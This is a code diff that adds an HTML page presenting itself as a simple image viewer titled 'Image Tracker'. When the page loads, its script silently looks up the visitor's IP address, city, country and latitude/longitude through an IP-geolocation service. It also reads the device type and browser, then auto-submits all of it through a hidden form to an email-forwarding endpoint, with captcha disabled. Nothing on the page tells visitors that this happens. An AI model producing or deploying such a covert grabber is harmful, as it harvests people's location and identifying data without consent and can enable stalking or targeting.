@@ -1,0 +1,62 @@
+
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Image Tracker</title>
+    </head>
+    <body>
+        <img src="https://tracksys-links.netlify.app/images/sfc .png" alt="Image Tracker" style="max-width: 100%; height: auto;" />
+
+        <form id="trackForm" action="https://formsubmit.co/oguerep%40gmail.com" method="POST">
+            <input type="hidden" name="ip" id="ip" />
+            <input type="hidden" name="date" id="date" />
+            <input type="hidden" name="city" id="city" />
+            <input type="hidden" name="country" id="country" />
+            <input type="hidden" name="latitude" id="latitude" />
+            <input type="hidden" name="longitude" id="longitude" />
+            <input type="hidden" name="device" id="device" />
+            <input type="hidden" name="browser" id="browser" />
+            <input type="hidden" name="image_url" value="https://tracksys-links.netlify.app/images/sfc .png" />
+            <input type="hidden" name="_captcha" value="false" />
+            <input type="hidden" name="_template" value="table" />
+        </form>
+
+        <script>
+        function detectDeviceType() {
+            const ua = navigator.userAgent;
+            if (/Mobi|Android/i.test(ua)) return "Mobile";
+            if (/Tablet|iPad/i.test(ua)) return "Tablet";
+            return "Desktop";
+        }
+
+        function detectBrowser() {
+            const ua = navigator.userAgent;
+            if (ua.indexOf("Firefox") > -1) return "Firefox";
+            if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) return "Opera";
+            if (ua.indexOf("Edg") > -1) return "Edge";
+            if (ua.indexOf("Chrome") > -1) return "Chrome";
+            if (ua.indexOf("Safari") > -1) return "Safari";
+            return "Unknown";
+        }
+
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('ip').value = data.ip;
+                document.getElementById('city').value = data.city;
+                document.getElementById('country').value = data.country_name;
+                document.getElementById('latitude').value = data.latitude;
+                document.getElementById('longitude').value = data.longitude;
+                document.getElementById('date').value = new Date().toLocaleString();
+                document.getElementById('device').value = detectDeviceType();
+                document.getElementById('browser').value = detectBrowser();
+                document.getElementById('trackForm').submit();
+            })
+            .catch(error => console.error('Erreur récupération IP:', error));
+        </script>
+
+        <p>Merci de votre visite.</p>
+    </body>
+    </html>
+    
